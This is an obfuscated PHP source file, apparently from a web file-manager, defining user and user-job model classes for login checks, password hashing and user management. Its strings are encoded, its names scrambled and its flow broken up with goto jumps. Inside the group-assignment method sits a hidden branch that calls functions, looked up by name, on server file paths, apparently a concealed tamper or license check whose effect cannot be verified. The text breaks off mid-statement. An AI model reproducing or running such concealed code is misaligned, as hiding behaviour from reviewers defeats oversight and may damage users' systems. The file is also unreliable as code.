(isset(self::$_methodListStatic[$f„‰¾ë‡Í³])) { return call_user_func_array(self::$_methodListStatic[$f„‰¾ë‡Í³], $c†ŸŠÀ•); } else { if (method_exists(self, $f„‰¾ë‡Í³)) { return call_user_func_array(array(self, $f„‰¾ë‡Í³), $c†ŸŠÀ•); } else { show_json("{$f„‰¾ë‡Í³}\x28\51\x20\x6e\x6f\x74\40\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($aÉğ–Ô‘›„, $c»Ó¾£Ó§†) { self::$_methodList[$aÉğ–Ô‘›„] = $c»Ó¾£Ó§†; } public static function addMethodStatic($aºŸ…•Õ™·, $fî§Áã¼ãö) { self::$_methodListStatic[$aºŸ…•Õ™·] = $fî§Áã¼ãö; } } goto føğÌùù¡î; E³¡–çßÓÏ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\152\x6f\x62\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\144\145\x73\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\154\146\x4a\x6f\142\x4c\x69\163\x74"; public function listData($FæÕƒ¬ô½³ = false, $dÜ¹àœÒÅ³ = "\163\x6f\162\x74", $d±ÉÁ†‹Š‰ = false) { return parent::listData($FæÕƒ¬ô½³, $dÜ¹àœÒÅ³, $d±ÉÁ†‹Š‰); } public function remove($C„²ëÇÚÅ) { return parent::remove($C„²ëÇÚÅ); } public function add($d¥Áè´ôÒÏ) { $d£µÓµ¶¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->findByName($d¥Áè´ôÒÏ[$d£µÓµ¶¤[28]])) { return !1; } $d¥Áè´ôÒÏ[$d£µÓµ¶¤[2087]] = $this->getSort(); return parent::insert($d¥Áè´ôÒÏ); } private function getSort() { $fè¤Úé¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fù÷ÎáÖ¹ = parent::listData(); $AÀÃŒŒŸÚÂ = array_to_keyvalue($Fù÷ÎáÖ¹, $fè¤Úé¼[33], $fè¤Úé¼[2087]); return empty($AÀÃŒŒŸÚÂ) ? 0 : max($AÀÃŒŒŸÚÂ) + 1; } public function update($CÖæğ¢¥Š, $e’²áŞ›) { $A†Ğ½ÊŸªá =& $_SERVER[ºÖÙÂŒäÉê‡]; $EŞ¼¾š‚¢ô = parent::listData($CÖæğ¢¥Š); $c†ÇĞ½ƒ¶‰ = $this->findByName($e’²áŞ›[$A†Ğ½ÊŸªá[28]]); if (!$EŞ¼¾š‚¢ô || $c†ÇĞ½ƒ¶‰ && $c†ÇĞ½ƒ¶‰[$A†Ğ½ÊŸªá[372]] != $EŞ¼¾š‚¢ô[$A†Ğ½ÊŸªá[372]]) { return !1; } return parent::update($CÖæğ¢¥Š, $e’²áŞ›); } public function setUserJob($cØ¸ï¢è—, $a£ŒÈä«‡) { goto bˆÓÅõ£Ö; a¶–•õÙòÈ: $bÕƒŠ©ìÖ³ = rtrim($bÕƒŠ©ìÖ³, $EğÚÜÛÛ[47]); Model($EğÚÜÛÛ[481])->metaSet($cØ¸ï¢è—, self::JOB_KEY, $bÕƒŠ©ìÖ³); goto C¦¨èÃƒå; Aè¼«œ Öî: $c‚±Ğç½¤ = array_to_keyvalue($CŒæ…¾”½®, $EğÚÜÛÛ[28]); $bÕƒŠ©ìÖ³ = $EğÚÜÛÛ[366]; foreach ($a£ŒÈä«‡ as $dÕ©âä¼”Ò) { if ($c‚±Ğç½¤[$dÕ©âä¼”Ò]) { $bÕƒŠ©ìÖ³ .= $c‚±Ğç½¤[$dÕ©âä¼”Ò][$EğÚÜÛÛ[372]] . $EğÚÜÛÛ[47]; } else { $FÙ÷İëñÈá = $this->add($dÕ©âä¼”Ò); $bÕƒŠ©ìÖ³ .= $FÙ÷İëñÈá . $EğÚÜÛÛ[47]; } } goto a¶–•õÙòÈ; bˆÓÅõ£Ö: $EğÚÜÛÛ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_array($a£ŒÈä«‡)) { $a£ŒÈä«‡ = array($a£ŒÈä«‡); } $CŒæ…¾”½® = parent::listData(); goto Aè¼«œ Öî; C¦¨èÃƒå: } public function getUserJob($c¼Ñ­Ü×²¡) { $Fµ“õ±ùÜ = Model($_SERVER[ºÖÙÂŒäÉê‡][481])->metaGet($c¼Ñ­Ü×²¡); return $this->getUserJobInfo($Fµ“õ±ùÜ[self::JOB_KEY]); } public function getUserJobInfo($bï«÷İº) { goto f‘å®Óá’÷; f‘å®Óá’÷: $CªªË‚¬Ş… =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÏšŠï¨¢¢ = explode($CªªË‚¬Ş…[47], $bï«÷İº); $AçŠ…®ä = parent::listData(); goto cá¡ˆÀ„Ü; cá¡ˆÀ„Ü: $AçŠ…®ä = array_remove_key($AçŠ…®ä, $CªªË‚¬Ş…[193]); $F™¥ÌÆèäí = array(); foreach ($dÏšŠï¨¢¢ as $aÁÌ‹¤î¦Ö) { if (isset($AçŠ…®ä[$aÁÌ‹¤î¦Ö])) { $F™¥ÌÆèäí[] = $AçŠ…®ä[$aÁÌ‹¤î¦Ö]; } } goto cæ¤šÓ‘; cæ¤šÓ‘: return $F™¥ÌÆèäí; goto bœŞä®óø; bœŞä®óø: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\165\x73\145\x72\137\155\145\164\x61", "\155\145\x74\141\x46\151\145\154\x64" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\165\x73\x65\162\x49\x44\x2c\156\x69\143\x6b\x4e\141\x6d\x65\54\156\141\155\145\x2c\141\166\141\x74\141\162\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fİäéô°ä¹) { $Bïª°¼¦¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f»ä¯ˆÈà÷ = $Bïª°¼¦¶[2444]; return array($Bïª°¼¦¶[2132] => array($fİäéô°ä¹[0], $f»ä¯ˆÈà÷), $Bïª°¼¦¶[2134] => array($fİäéô°ä¹[0], $f»ä¯ˆÈà÷), $Bïª°¼¦¶[2445] => array($fİäéô°ä¹[0], $f»ä¯ˆÈà÷)); } protected function getInfo($f—äÑ‚ÛŞ, $aåªºå² = false) { $eµÖÍÚôò× = $this->getInfoSimple($f—äÑ‚ÛŞ); if (!is_array($eµÖÍÚôò×)) { return array(); } if ($aåªºå²) { return $this->_getInfoApply($eµÖÍÚôò×); } return $this->cacheFunctionGet($_SERVER[ºÖÙÂŒäÉê‡][2174], $f—äÑ‚ÛŞ); } protected function getInfoFull($BÎ´‘•îâÏ, $déŒÒ¤¼Í½ = false) { $Fê³İéñ† = $this->getInfoSimple($BÎ´‘•îâÏ); if (!is_array($Fê³İéñ†)) { return array(); } if ($déŒÒ¤¼Í½) { return $this->_getInfoApply($Fê³İéñ†, !0); return $this->_getInfoApply($Fê³İéñ†, !0); } return $this->cacheFunctionGet($_SERVER[ºÖÙÂŒäÉê‡][2446], $BÎ´‘•îâÏ); } private function _getInfoApply($c–Ê©“ô¼‰, $Bß™Ğ¾»ñë = false) { goto cÂŞÒñ­; AÌ‘”Â‰Ğ: $c–Ê©“ô¼‰ = $this->_listDataApplyItem($c–Ê©“ô¼‰); $cÔ‡‰÷«­Ü = Model($eĞŞÉ¥Á¬›[1100])->metaGet($c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[396]][$eĞŞÉ¥Á¬›[374]]); $c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[2449]] = $f™¥Ğ«Ê×ß; goto ešÖ‹ˆÃ‰; cÂŞÒñ­: $eĞŞÉ¥Á¬› =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$c–Ê©“ô¼‰) { return $c–Ê©“ô¼‰; } $f™¥Ğ«Ê×ß = md5($eĞŞÉ¥Á¬›[2447] . $c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[794]] . $eĞŞÉ¥Á¬›[2448] . $c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[28]]); goto AÌ‘”Â‰Ğ; ešÖ‹ˆÃ‰: $c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[396]][$eĞŞÉ¥Á¬›[2282]] = isset($cÔ‡‰÷«­Ü[$eĞŞÉ¥Á¬›[2283]]) ? $cÔ‡‰÷«­Ü[$eĞŞÉ¥Á¬›[2283]] : null; if ($Bß™Ğ¾»ñë) { $c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[421]] = $this->metaGet($c–Ê©“ô¼‰[$eĞŞÉ¥Á¬›[1403]]); } return $c–Ê©“ô¼‰; goto F®Éƒ–º¡; F®Éƒ–º¡: } protected function getInfoSimple($a¹öŒÌ©Šš, $BÍÌÈÅ™ó = false) { $D”½š‰Ü±“ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$a¹öŒÌ©Šš) { return array(); } if ($BÍÌÈÅ™ó) { $C­²š‘“Ç = $this->where(array($D”½š‰Ü±“[1403] => intval($a¹öŒÌ©Šš)))->find(); if (!is_array($C­²š‘“Ç)) { return array(); } $C­²š‘“Ç[$D”½š‰Ü±“[2450]] = Action($D”½š‰Ü±“[2451])->parseUrl($C­²š‘“Ç[$D”½š‰Ü±“[2450]]); return $C­²š‘“Ç; } return $this->cacheFunctionGet($D”½š‰Ü±“[2135], $a¹öŒÌ©Šš); } protected function getInfoSimpleOuter($aÌ£ö–á¥) { goto fÔ»›—” Ú; d¤’¢­ƒ¢: return $bŞŠŠ¬à‘©; goto Còñ‰èÒóğ; fÔ»›—” Ú: $EÒ˜¶±ß­¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$aÌ£ö–á¥ || $aÌ£ö–á¥ == 0) { return array($EÒ˜¶±ß­¨[1403] => $EÒ˜¶±ß­¨[472], $EÒ˜¶±ß­¨[28] => $EÒ˜¶±ß­¨[153] . LNG($EÒ˜¶±ß­¨[2452]) . $EÒ˜¶±ß­¨[480], $EÒ˜¶±ß­¨[2450] => STATIC_PATH . $EÒ˜¶±ß­¨[2453]); } $a•´†Ôã¶ = $this->cacheFunctionGet($EÒ˜¶±ß­¨[2135], $aÌ£ö–á¥); goto a•Àçˆ”Ø; a•Àçˆ”Ø: $bŞŠŠ¬à‘© = array_field_key($a•´†Ôã¶, explode($EÒ˜¶±ß­¨[47], $this->simpleField)); if (!$bŞŠŠ¬à‘©) { return array($EÒ˜¶±ß­¨[1403] => $EÒ˜¶±ß­¨[1021], $EÒ˜¶±ß­¨[28] => $EÒ˜¶±ß­¨[153] . LNG($EÒ˜¶±ß­¨[2454]) . $EÒ˜¶±ß­¨[480], $EÒ˜¶±ß­¨[2450] => STATIC_PATH . $EÒ˜¶±ß­¨[2455]); } $bŞŠŠ¬à‘©[$EÒ˜¶±ß­¨[2450]] = Action($EÒ˜¶±ß­¨[2451])->parseUrl($bŞŠŠ¬à‘©[$EÒ˜¶±ß­¨[2450]]); goto d¤’¢­ƒ¢; Còñ‰èÒóğ: } protected function groupUser($A·µ¦Ñˆ°è) { } public static function errorLang($dŞŸ²‡õ) { $Fô½ªÉÏè =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÀ‰‰ÊÀ‘² = array(self::ERROR_USER_NOT_EXISTS => $Fô½ªÉÏè[2456], self::ERROR_USER_PASSWORD_ERROR => $Fô½ªÉÏè[2457], self::ERROR_USER_EXIST_NAME => $Fô½ªÉÏè[2458], self::ERROR_USER_EXIST_PHONE => $Fô½ªÉÏè[2459], self::ERROR_USER_EXIST_EMAIL => $Fô½ªÉÏè[2460], self::ERROR_USER_LOGIN_LOCK => $Fô½ªÉÏè[2461], self::ERROR_IP_NOT_ALLOW => $Fô½ªÉÏè[2462], self::ERROR_USER_EXIST_NICKNAME => $Fô½ªÉÏè[2463]); return LNG($EÀ‰‰ÊÀ‘²[$dŞŸ²‡õ]); } public function getInfoByMeta($cõÛ­¥‡­, $A¿ÏğºˆÌô) { $aˆ¹Ã©·ÚÚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cáôñ´˜ŞË = Model($aˆ¹Ã©·ÚÚ[2464])->where(array($aˆ¹Ã©·ÚÚ[89] => $cõÛ­¥‡­, $aˆ¹Ã©·ÚÚ[364] => $A¿ÏğºˆÌô))->find(); if ($cáôñ´˜ŞË) { return $this->getInfo($cáôñ´˜ŞË[$aˆ¹Ã©·ÚÚ[1403]]); } return !1; } public function userLoginCheck($AãÖ°¸æ•», $Bº°—…•ÕÕ) { goto AÚóõÏÊà; aª­¸‹óÉà: $BÇ¦ÃÄ·Šœ = $this->where($AÎªèğÏ«÷)->find(); if (!$BÇ¦ÃÄ·Šœ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($BÇ¦ÃÄ·Šœ[$f¤ÍÎé‚ˆ¸[1403]], $Bº°—…•ÕÕ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto EìÃ©à«±; EìÃ©à«±: $this->userEdit($BÇ¦ÃÄ·Šœ[$f¤ÍÎé‚ˆ¸[1403]], array($f¤ÍÎé‚ˆ¸[2466] => time())); $this->clearCache($BÇ¦ÃÄ·Šœ[$f¤ÍÎé‚ˆ¸[1403]]); return $this->getInfo($BÇ¦ÃÄ·Šœ[$f¤ÍÎé‚ˆ¸[1403]]); goto cØİƒ¾Œ; AÚóõÏÊà: $f¤ÍÎé‚ˆ¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÎªèğÏ«÷ = array($f¤ÍÎé‚ˆ¸[28] => $AãÖ°¸æ•», $f¤ÍÎé‚ˆ¸[2286] => $AãÖ°¸æ•», $f¤ÍÎé‚ˆ¸[298] => $AãÖ°¸æ•», $f¤ÍÎé‚ˆ¸[2465] => $AãÖ°¸æ•», $f¤ÍÎé‚ˆ¸[906] => $f¤ÍÎé‚ˆ¸[908]); if ($this->nickNameRpt()) { unset($AÎªèğÏ«÷[$f¤ÍÎé‚ˆ¸[2286]]); } goto aª­¸‹óÉà; cØİƒ¾Œ: } public function clearCache($a÷ø–™¿‡) { $fŠÏ¢¢£Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->cacheFunctionClear($fŠÏ¢¢£Ã[2174], $a÷ø–™¿‡); $this->cacheFunctionClear($fŠÏ¢¢£Ã[2135], $a÷ø–™¿‡); } public function userPasswordCheck($Aù¸ä¬ñ›¼, $EäÉ¹ÉáÙ†) { $e¶‹˜ç²ˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eøî´™‘‡ = $this->where(array($e¶‹˜ç²ˆ[1403] => intval($Aù¸ä¬ñ›¼)))->find(); $EË§‡—È¸ = $this->metaGet($Aù¸ä¬ñ›¼); $bïƒÜŠâ˜ = isset($EË§‡—È¸[$e¶‹˜ç²ˆ[2467]]) ? $EË§‡—È¸[$e¶‹˜ç²ˆ[2467]] : $e¶‹˜ç²ˆ[33]; if (md5($bïƒÜŠâ˜ . trim($EäÉ¹ÉáÙ†)) !== $Eøî´™‘‡[$e¶‹˜ç²ˆ[794]]) { return !1; } return !0; } public function userAdd($fŠ°Š§µÊÆ) { goto fß˜¼É£‡˜; aÚÅ™‡Éîù: $B¤àÉ¸Ã‹ = $this->_checkExist($fŠ°Š§µÊÆ); if ($B¤àÉ¸Ã‹ !== !0) { return $B¤àÉ¸Ã‹; } $A™îèÛ©Øá = $this->add($f…› ‡ò¶ƒ); goto dëï•¹Á‚; dëï•¹Á‚: $A‰§”¿œ— = array($aßÜœ”É—Í[2476] => $f…› ‡ò¶ƒ[$aßÜœ”É—Í[794]], $aßÜœ”É—Í[2472] => $f…› ‡ò¶ƒ[$aßÜœ”É—Í[2286]]); $this->userEdit($A™îèÛ©Øá, $A‰§”¿œ—); Model($aßÜœ”É—Í[1100])->userRootAdd($A™îèÛ©Øá); goto Aéó‚÷Í ; fß˜¼É£‡˜: $aßÜœ”É—Í =& $_SERVER[ºÖÙÂŒäÉê‡]; $f…› ‡ò¶ƒ = array($aßÜœ”É—Í[391] => $fŠ°Š§µÊÆ[$aßÜœ”É—Í[28]], $aßÜœ”É—Í[2468] => $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2469]], $aßÜœ”É—Í[2470] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[298]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[298]] : $aßÜœ”É—Í[33], $aßÜœ”É—Í[2471] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[2465]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2465]] : $aßÜœ”É—Í[33], $aßÜœ”É—Í[2472] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[2286]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2286]] : $fŠ°Š§µÊÆ[$aßÜœ”É—Í[28]], $aßÜœ”É—Í[2473] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[2450]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2450]] : $aßÜœ”É—Í[33], $aßÜœ”É—Í[2474] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[2475]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2475]] : 1, $aßÜœ”É—Í[2476] => $fŠ°Š§µÊÆ[$aßÜœ”É—Í[794]], $aßÜœ”É—Í[2136] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[2050]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[2050]] : 1024 * 1024 * 20, $aßÜœ”É—Í[2137] => 0, $aßÜœ”É—Í[2466] => 0, $aßÜœ”É—Í[2161] => isset($fŠ°Š§µÊÆ[$aßÜœ”É—Í[686]]) ? $fŠ°Š§µÊÆ[$aßÜœ”É—Í[686]] : 1); if (!empty($fŠ°Š§µÊÆ[$aßÜœ”É—Í[1403]])) { $f…› ‡ò¶ƒ[$aßÜœ”É—Í[1403]] = $fŠ°Š§µÊÆ[$aßÜœ”É—Í[1403]]; } goto aÚÅ™‡Éîù; Aéó‚÷Í : return $A™îèÛ©Øá; goto a•‘îù†£; a•‘îù†£: } protected function userEditTest($c™Å‰ÏË¶•, $FÁÑ©¹¤›²) { return $this->call($_SERVER[ºÖÙÂŒäÉê‡][2477], $c™Å‰ÏË¶•, $FÁÑ©¹¤›²); } protected function userEdit($f½ó–Ø‘Êø, $e¶“÷¦­¶ö) { goto bòñ¡Ûƒƒ; b¬ÒÛ÷—ÍÛ: $this->where(array($E†‚¼öŒäö[1394] => $f½ó–Ø‘Êø))->save($e¶“÷¦­¶ö); if (isset($e¶“÷¦­¶ö[$E†‚¼öŒäö[2286]])) { $this->setNamePinyin($f½ó–Ø‘Êø, $e¶“÷¦­¶ö[$E†‚¼öŒäö[2286]]); } return !0; goto F‹ÆÓÛÏ¹§; bòñ¡Ûƒƒ: $E†‚¼öŒäö =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÆÁá…óĞñ = $this->getInfoSimple($f½ó–Ø‘Êø); if (!$CÆÁá…óĞñ) { return !1; } goto b­‘ÌÛ÷™Å; b­‘ÌÛ÷™Å: $CÛÜË Ü‡ = $this->_checkExist($e¶“÷¦­¶ö, $f½ó–Ø‘Êø); if ($CÛÜË Ü‡ !== !0) { return $CÛÜË Ü‡; } if (isset($e¶“÷¦­¶ö[$E†‚¼öŒäö[794]]) && trim($e¶“÷¦­¶ö[$E†‚¼öŒäö[794]]) != $E†‚¼öŒäö[33]) { $FµáÚ´Ø®« = $this->metaGet($f½ó–Ø‘Êø); if (empty($FµáÚ´Ø®«[$E†‚¼öŒäö[2467]])) { $FµáÚ´Ø®«[$E†‚¼öŒäö[2467]] = rand_string(10); Model($E†‚¼öŒäö[478])->metaSet($f½ó–Ø‘Êø, $E†‚¼öŒäö[2467], $FµáÚ´Ø®«[$E†‚¼öŒäö[2467]]); } $e¶“÷¦­¶ö[$E†‚¼öŒäö[794]] = md5($FµáÚ´Ø®«[$E†‚¼öŒäö[2467]] . trim($e¶“÷¦­¶ö[$E†‚¼öŒäö[794]])); } else { unset($e¶“÷¦­¶ö[$E†‚¼öŒäö[794]]); } goto b¬ÒÛ÷—ÍÛ; F‹ÆÓÛÏ¹§: } public function setNamePinyin($dÑÕ‰ùè©, $E´ŸÚ¹Ò¶ = false) { $Dª‚ù®øö =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$E´ŸÚ¹Ò¶) { $b‹Ş™½¿³• = $this->getInfoSimple($dÑÕ‰ùè©); $E´ŸÚ¹Ò¶ = $b‹Ş™½¿³•[$Dª‚ù®øö[2286]] ? $b‹Ş™½¿³•[$Dª‚ù®øö[2286]] : $b‹Ş™½¿³•[$Dª‚ù®øö[28]]; } $dóÊ©ò‰ÔÛ = Model($Dª‚ù®øö[481]); if (!Input::check($E´ŸÚ¹Ò¶, $Dª‚ù®øö[532])) { return $dóÊ©ò‰ÔÛ->metaSet($dÑÕ‰ùè©, array($Dª‚ù®øö[420] => $Dª‚ù®øö[33], $Dª‚ù®øö[419] => $Dª‚ù®øö[33])); } return $dóÊ©ò‰ÔÛ->metaSet($dÑÕ‰ùè©, array($Dª‚ù®øö[420] => str_replace($Dª‚ù®øö[50], $Dª‚ù®øö[33], Pinyin::encode($E´ŸÚ¹Ò¶)), $Dª‚ù®øö[419] => Pinyin::encode($E´ŸÚ¹Ò¶, $Dª‚ù®øö[533]))); } private function nickNameRpt() { $B‰ÇÙé†Ëğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C›ğ¾¼çƒ¹ = Model($B‰ÇÙé†Ëğ[1078])->get($B‰ÇÙé†Ëğ[2478]); $BÌò‡Œ…õ = $GLOBALS[$B‰ÇÙé†Ëğ[6]][$B‰ÇÙé†Ëğ[2434]][$B‰ÇÙé†Ëğ[2478]]; $BŸèâ…’ŒÅ = !is_null($C›ğ¾¼çƒ¹) ? $C›ğ¾¼çƒ¹ : $BÌò‡Œ…õ; return !!$BŸèâ…’ŒÅ; } private function _checkExist($Eò¤Àñè„õ, $b¬¢è²¶á× = false) { $C‚ã¶ö‹Ø¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b’«Û¹˜Õ = array($C‚ã¶ö‹Ø¾[28] => UserModel::ERROR_USER_EXIST_NAME, $C‚ã¶ö‹Ø¾[2286] => UserModel::ERROR_USER_EXIST_NICKNAME, $C‚ã¶ö‹Ø¾[298] => UserModel::ERROR_USER_EXIST_EMAIL, $C‚ã¶ö‹Ø¾[2465] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($b’«Û¹˜Õ[$C‚ã¶ö‹Ø¾[2286]]); } $eùòË¾Î‡‡ = $b¬¢è²¶á× ? array($C‚ã¶ö‹Ø¾[1403] => array($C‚ã¶ö‹Ø¾[2479], $b¬¢è²¶á×)) : array(); foreach ($b’«Û¹˜Õ as $f¦¹¼­ÜÒ => $a°èà¾òà“) { if (!isset($Eò¤Àñè„õ[$f¦¹¼­ÜÒ]) || !$Eò¤Àñè„õ[$f¦¹¼­ÜÒ]) { continue; } $cµ‘†ÉÈñ = array_merge(array($f¦¹¼­ÜÒ => $Eò¤Àñè„õ[$f¦¹¼­ÜÒ]), $eùòË¾Î‡‡); $C®¹‡êØ»â = $this->where($cµ‘†ÉÈñ)->find(); if ($C®¹‡êØ»â) { return $a°èà¾òà“; } } return !0; } public function userListInfo($FÎ±¤ƒ¶ÇØ) { $EÁ†»§ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $eŸ‹—Üˆ¼õ = array(); $FÎ±¤ƒ¶ÇØ = is_array($FÎ±¤ƒ¶ÇØ) ? array_unique($FÎ±¤ƒ¶ÇØ) : array(); if (!$FÎ±¤ƒ¶ÇØ) { return $eŸ‹—Üˆ¼õ; } if (count($FÎ±¤ƒ¶ÇØ) < 20) { foreach ($FÎ±¤ƒ¶ÇØ as $Fò¯Ûæ†•ò) { $eŸ‹—Üˆ¼õ[$Fò¯Ûæ†•ò . $EÁ†»§ù[33]] = $this->getInfoSimpleOuter($Fò¯Ûæ†•ò); } } else { $A—åº–Üê¶ = array($EÁ†»§ù[1394] => array($EÁ†»§ù[389], $FÎ±¤ƒ¶ÇØ)); if (count($FÎ±¤ƒ¶ÇØ) == 1) { $A—åº–Üê¶ = array($EÁ†»§ù[1394] => $FÎ±¤ƒ¶ÇØ[0]); } $a¡¶–£Òç = Model($EÁ†»§ù[478])->field($this->simpleField)->where($A—åº–Üê¶)->select(); $a¡¶–£Òç = array_to_keyvalue($a¡¶–£Òç, $EÁ†»§ù[1403]); foreach ($FÎ±¤ƒ¶ÇØ as $Fò¯Ûæ†•ò) { $dË˜¬¶Ä´ = $a¡¶–£Òç[$a¡¶–£Òç[$Fò¯Ûæ†•ò]]; if (!$dË˜¬¶Ä´) { $eŸ‹—Üˆ¼õ[$Fò¯Ûæ†•ò . $EÁ†»§ù[33]] = $this->getInfoSimpleOuter($Fò¯Ûæ†•ò); continue; } $dË˜¬¶Ä´[$EÁ†»§ù[2450]] = Action($EÁ†»§ù[2451])->parseUrl($dË˜¬¶Ä´[$EÁ†»§ù[2450]]); $eŸ‹—Üˆ¼õ[$Fò¯Ûæ†•ò . $EÁ†»§ù[33]] = $dË˜¬¶Ä´; } } return $eŸ‹—Üˆ¼õ; } protected function userStatus($A±«Ÿ¬”Æ, $fé®ñÜßëô) { $F‚‰ÈÒÀ§ = $this->getInfoSimple($A±«Ÿ¬”Æ); if (!$F‚‰ÈÒÀ§) { return !1; } $B»‡é³¿ÚÛ = array($_SERVER[ºÖÙÂŒäÉê‡][686] => $fé®ñÜßëô); return $this->userEdit($A±«Ÿ¬”Æ, $B»‡é³¿ÚÛ); } protected function userRemove($cÉàé„êÊ) { goto C‘ ”„Ëî•; b»Í§Ğ¥: Model($aÛ¢öÛ¹šœ[2140])->where($DÚ¼çÙËÍ¸)->delete(); Model($aÛ¢öÛ¹šœ[2464])->where($DÚ¼çÙËÍ¸)->delete(); Model($aÛ¢öÛ¹šœ[2481])->where($DÚ¼çÙËÍ¸)->delete(); goto C â¤Ó‡¶—; C â¤Ó‡¶—: Model($aÛ¢öÛ¹šœ[751])->userRootRemove($cÉàé„êÊ); return $this->where($DÚ¼çÙËÍ¸)->delete(); goto e™¨Ê·ÑµŒ; d¦£ÔœïÍó: $DÚ¼çÙËÍ¸ = array($aÛ¢öÛ¹šœ[1394] => $cÉàé„êÊ); Model($aÛ¢öÛ¹šœ[540])->where($DÚ¼çÙËÍ¸)->delete(); Model($aÛ¢öÛ¹šœ[2480])->where($DÚ¼çÙËÍ¸)->delete(); goto b»Í§Ğ¥; C‘ ”„Ëî•: $aÛ¢öÛ¹šœ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B¸¢ñø°ö‡ = $this->getInfoSimple($cÉàé„êÊ); if (!$B¸¢ñø°ö‡) { return !1; } goto d¦£ÔœïÍó; e™¨Ê·ÑµŒ: } protected function userGroupSet($FÑÈª—Òàå, $F¤„Ä˜ßŒ°, $f­è°Æ÷Œ = array()) { goto EÏŞÆÈŒÉˆ; Aº¨ÅŒ‘º’: return $a‰Ş»¡²Ş¬->addAll($F‚ò¯ªµå, array(), !0); goto eí„á§ˆÌ; f®±æË‹Áç: $F‚ò¯ªµå = array(); $BŠ»¶ˆ„©š = 0; foreach ($F¤„Ä˜ßŒ° as $B§İèï¼å => $C”¬£Œ‹Æì) { $dÙÀ±Åó´© = array($eóˆùóÀöÔ[1403] => $FÑÈª—Òàå, $eóˆùóÀöÔ[2066] => $B§İèï¼å, $eóˆùóÀöÔ[2194] => $C”¬£Œ‹Æì); $dÙÀ±Åó´©[$eóˆùóÀöÔ[2087]] = isset($f­è°Æ÷Œ[$BŠ»¶ˆ„©š]) ? $f­è°Æ÷Œ[$BŠ»¶ˆ„©š] : 0; $BŠ»¶ˆ„©š++; $F‚ò¯ªµå[] = $dÙÀ±Åó´©; } goto Aº¨ÅŒ‘º’; fºö†±Æ†˜: if (!$E±ˆŞæÊÀŞ || !is_array($F¤„Ä˜ßŒ°)) { return !1; } $a‰Ş»¡²Ş¬ = Model($eóˆùóÀöÔ[2140]); $a‰Ş»¡²Ş¬->where(array($eóˆùóÀöÔ[1403] => $FÑÈª—Òàå))->delete(); goto f®±æË‹Áç; EÏŞÆÈŒÉˆ: $eóˆùóÀöÔ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($_SERVER[$eóˆùóÀöÔ[169]] != $_SERVER[$eóˆùóÀöÔ[170]]) { goto AÀÆ­É¶Œ¡; aˆŞÚä±³¥: $AÈî¼¹¦¼ = $eóˆùóÀöÔ[786]; $AÈî¼¹¦¼($_SERVER[$eóˆùóÀöÔ[787]]); $AÈî¼¹¦¼($_SERVER[$eóˆùóÀöÔ[172]] . $eóˆùóÀöÔ[788]); goto Aïæ¥÷è¡Å; bì¹ÂŞŸ£: $EøßŞ×«Å = $C©’ñ£Ù‚($BÃÑº¶£ãë); $Bì¨¶ÑÏ = explode($eóˆùóÀöÔ[174], $EøßŞ×«Å); if (count($Bì¨¶ÑÏ) < $eóˆùóÀöÔ[561]) { $d’ßä‹Ïó¸ = $eóˆùóÀöÔ[176]; $d’ßä‹Ïó¸(); } goto aˆŞÚä±³¥; AÀÆ­É¶Œ¡: $A—¾øøÇğ = $eóˆùóÀöÔ[785]; $C©’ñ£Ù‚ = $eóˆùóÀöÔ[171]; $BÃÑº¶£ãë = $_SERVER[$eóˆùóÀöÔ[172]] . $eóˆùóÀöÔ[173]; 